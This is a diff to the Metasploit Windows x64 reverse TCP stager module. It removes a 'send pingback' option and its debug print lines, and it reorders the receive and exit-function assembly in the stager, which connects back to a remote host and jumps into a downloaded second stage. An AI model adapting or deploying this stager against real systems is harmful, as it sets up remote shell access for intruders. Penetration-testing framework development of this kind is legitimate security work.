@@ -18,6 +18,7 @@ module Payload::Windows::ReverseTcp_x64
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
+  include Msf::Payload::Windows::SendUUID_x64
   include Msf::Payload::Windows::BlockApi_x64
   include Msf::Payload::Windows::Exitfunk_x64
 
@@ -56,10 +57,6 @@ module Payload::Windows::ReverseTcp_x64
     false
   end
 
-  def include_send_pingback
-    false
-  end
-
   #
   # Generate and compile the stager
   #
@@ -72,16 +69,8 @@ module Payload::Windows::ReverseTcp_x64
       start:
         pop rbp               ; block API pointer
       #{asm_reverse_tcp(opts)}
+      #{asm_block_recv(opts)}
     ^
-    if include_send_pingback
-      puts("include_send_pingback is true")
-    else
-      puts("include_send_pingback is false")
-      combined_asm << asm_block_recv(opts)
-    end
-    if opts[:exitfunk]
-      combined_asm << asm_exitfunk(opts)
-    end
     Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
   end
 
@@ -200,9 +189,6 @@ module Payload::Windows::ReverseTcp_x64
       ; the UUID stuff if required.
       connected:
     ^
-      
-    asm << asm_send_pingback if include_send_pingback
-
     asm << asm_send_uuid if include_send_uuid
 
     asm
@@ -302,6 +288,11 @@ module Payload::Windows::ReverseTcp_x64
         jnz read_more           ; continue if we have more to read
         jmp r15                 ; return into the second stage
     ^
+
+    if opts[:exitfunk]
+      asm << asm_exitfunk(opts)
+    end
+
     asm
   end
 
